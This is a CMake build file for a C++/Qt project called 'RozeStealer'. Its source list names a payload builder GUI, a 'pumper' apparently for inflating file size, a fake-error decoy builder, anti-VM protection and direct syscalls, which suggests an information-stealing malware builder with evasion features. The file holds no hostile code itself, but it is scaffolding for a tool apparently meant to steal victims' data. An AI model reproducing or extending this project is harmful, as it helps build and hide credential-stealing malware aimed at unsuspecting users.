cmake_minimum_required(VERSION 3.10)
project(RozeStealer VERSION 1.0.0 LANGUAGES CXX)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_AUTOMOC ON)
set(CMAKE_AUTORCC ON)
set(CMAKE_AUTOUIC ON)

find_package(Qt5 COMPONENTS Core Widgets Network REQUIRED)
find_package(nlohmann_json 3.10.5 REQUIRED)

set(SOURCES
    src/main.cpp
    src/Core/Settings.cpp
    src/Core/Errors.cpp
    src/Core/Tasks.cpp
    src/Core/Syscalls.cpp
    src/Core/Process.cpp
    src/Core/VmProtect.cpp
    src/Utils/Utility.cpp
    src/GUI/Builder.cpp
    src/GUI/BuilderOptionsFrame/BuilderOptionsFrame.cpp
    src/GUI/PumperSettings/PumperSettings.cpp
    src/GUI/FakeErrorBuilder/FakeErrorBuilder.cpp
)

set(HEADERS
    src/Core/Settings.h
    src/Core/Errors.h
    src/Core/Tasks.h
    src/Core/Syscalls.h
    src/Core/Process.h
    src/Core/VmProtect.h
    src/Utils/Utility.h
    src/GUI/Builder.h
    src/GUI/BuilderOptionsFrame/BuilderOptionsFrame.h
    src/GUI/PumperSettings/PumperSettings.h
    src/GUI/FakeErrorBuilder/FakeErrorBuilder.h
)

add_executable(RozeStealer ${SOURCES} ${HEADERS})

target_include_directories(RozeStealer PRIVATE ${CMAKE_CURRENT_SOURCE_DIR})
target_link_libraries(RozeStealer PRIVATE Qt5::Core Qt5::Widgets Qt5::Network nlohmann_json::nlohmann_json)

if(WIN32)
    target_link_libraries(RozeStealer PRIVATE ws2_32 iphlpapi wlanapi wtsapi32 netapi32 shell32 wbemuuid crypt32)
endif()

# Set application icon for Windows
if(WIN32)
    set(APP_ICON_RESOURCE_WINDOWS "${CMAKE_CURRENT_SOURCE_DIR}/resources/icon.rc")
    target_sources(RozeStealer PRIVATE ${APP_ICON_RESOURCE_WINDOWS})
endif()

# Install rules
install(TARGETS RozeStealer
    RUNTIME DESTINATION bin
)

